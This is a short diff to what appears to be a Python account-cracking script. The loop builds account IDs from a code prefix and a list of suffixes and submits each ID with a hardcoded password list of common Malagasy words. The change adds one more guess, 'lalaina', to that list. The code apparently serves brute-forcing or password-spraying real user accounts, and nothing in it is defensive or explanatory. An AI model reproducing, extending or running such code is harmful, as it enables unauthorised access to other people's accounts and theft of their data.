@@ -443,7 +443,7 @@ def pak():
                         linex()
                         for psx in user:
                                 ids = code+psx
-                                passlist = [psx,ids,'fitiavana','Fitiavana','malala','Malala','mamako','sarika','nirina','Nirina','fiderana','mamiko','fanomezana','malalako','sarobidy','vadiko','niaina','safidy','nantenaina','anjara','milely','fanantenana','mirana','tolotra','faniry','nomena','tahiry','tanjona','rakoto','sitraka','zanako','felana','tantely','sarika','papako','lalatiana','niaina','faniry','nilaina','mihary','mahery','Mahery','fanomezana','sitraka','avotra','nantenaina','tahina','fitahina','fifaliana','fitahiana','anjara']
+                                passlist = [psx,ids,'fitiavana','Fitiavana','malala','Malala','mamako','sarika','nirina','Nirina','fiderana','mamiko','fanomezana','lalaina','malalako','sarobidy','vadiko','niaina','safidy','nantenaina','anjara','milely','fanantenana','mirana','tolotra','faniry','nomena','tahiry','tanjona','rakoto','sitraka','zanako','felana','tantely','sarika','papako','lalatiana','niaina','faniry','nilaina','mihary','mahery','Mahery','fanomezana','sitraka','avotra','nantenaina','tahina','fitahina','fifaliana','fitahiana','anjara']
                                 ennic.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
